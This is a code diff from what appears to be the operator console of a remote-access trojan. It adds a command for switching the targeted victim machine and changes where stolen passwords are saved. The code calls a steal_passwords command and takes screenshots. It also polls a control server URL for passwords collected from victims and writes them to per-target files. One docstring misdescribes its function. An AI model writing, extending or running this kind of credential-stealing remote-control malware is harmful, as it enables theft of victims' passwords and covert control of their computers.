@@ -15,6 +15,10 @@ users_directory = os.path.join(current_directory, 'Users', "User.json")
 
 target_session = input("Enter Target Here: ")
 
+
+
+
+
 class CommandClass:
     def __init__(self, command: str) -> None:
         self.command = command
@@ -27,6 +31,7 @@ class CommandClass:
             'password': (self.steal_passwords, self.steal_passwords.__doc__),
             'volume': (self.change_volume, self.change_volume.__doc__),
             'menu': (self.menu, self.menu.__doc__),
+            'ctarget': (self.ctarget, self.ctarget.__doc__)
         }
         
     def execute_command(self):
@@ -44,6 +49,16 @@ class CommandClass:
             LAST_TARGET = target
         except Exception as e:
             print(e)
+            
+    def ctarget(self):
+        """
+            Execute a command on the client machine.
+            Prompts for the new target.
+        """
+        global target_session
+        
+        target_session = input("Enter Target Here: ")
+        print(f"Changed Target: {target_session}")
 
     def take_screenshot(self):
         """
@@ -194,8 +209,8 @@ def listen():
                         print(f"\nResponse: {response}\nCommand: ", end="")
                 elif i == "password" and v["passwords"] != []:
                     requests.get(f"{URL}/passwords?target={LAST_TARGET}&state=false&passwords=[]")
-                    print(f"\npasswords retrived from the client \n File Path: {current_directory}/passwords-{LAST_TARGET}.txt\nCommand: ", end="")
-                    with open(f"{current_directory}/passwords-{LAST_TARGET}.txt", "w") as f:
+                    print(f"\npasswords retrived from the client \n File Path: {current_directory}/data/passwords-{LAST_TARGET}.txt\nCommand: ", end="")
+                    with open(f"{current_directory}/data/passwords-{LAST_TARGET}.txt", "w") as f:
                         for password_info in v["passwords"]:
                             f.write(password_info + "\n")
                     LAST_TARGET = ""
